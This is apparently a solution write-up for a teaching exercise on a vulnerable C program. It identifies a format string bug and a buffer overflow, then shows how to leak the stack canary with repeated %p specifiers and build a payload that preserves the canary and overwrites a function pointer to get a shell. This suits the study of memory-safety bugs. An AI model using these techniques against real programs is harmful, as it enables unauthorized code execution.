1. The program is affected by a buffer overflow and a format string vulnerability.

The problematic lines are:

printf(data.name_buf); // Format string vulnerability
user_input(" password", data.pass_buf, sizeof(data)); // Buffer overflow vulnerability

Explanations and fixes are identical to the previous exercises, so they are omitted.

2. Exploiting this program is slightly harder, as we do not have any debug logging, apart
from the the address of the shellcode function. However, we do have two separate vulnerabilities.

To successfully run the shellcode, we need to provide the following input to `user_input`:

[16 bytes password] [64 bytes user name] [8 bytes canary] [16 bytes password] [8 bytes shellcode pointer]

The values must be chosen as follows:

- The two 16 bytes password fields must be equal (we "choose" the password).
- The user name must be "admin", followed by at least one zero character (the NULL terminator)
  and padded to 64 bytes with arbitrary characters.
- The canary value must be kept unchanged.

Unfortunately we do not know the canary value. However, we can exploit the format string vulnerability
to print stack data. We can use any format specifier of out choosing ("%p" is a good choice as usual),
as long as we correctly interpret what is being printed out.

Example (shellcode: 0x10421c8d8)
--------------------------------

User name: %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
0x10421c8d8 0x16bbe22b8 0x70 0x16bbe22b8 0x76d30d9a 0x16bbe29b8 0x2 0x0 0x0 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x702520702520 0x76d30d9a 0x3732357434326469 0x316432687466 0x10421c8f4 password:

> Notice that there is a long sequence of 25 (%), 70 (p), 20 (space) bytes. That is our input string,
> corresponding to the `data.name_buf` field. It is followed by 0x76d30d9a (`data.canary`),
> two 8 bytes values (`data.password`), and 0x10421c8f4 (`data.fun`). With this knowledge, we can
> craft our input string, structured as indicated above:

... password: p4ssw0rd\00PPPPPPPadmin\00PPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPP\9a\0d\d3\76\00\00\00\00p4ssw0rd\00PPPPPPP\d8\c8\21\04\01
You got shell!
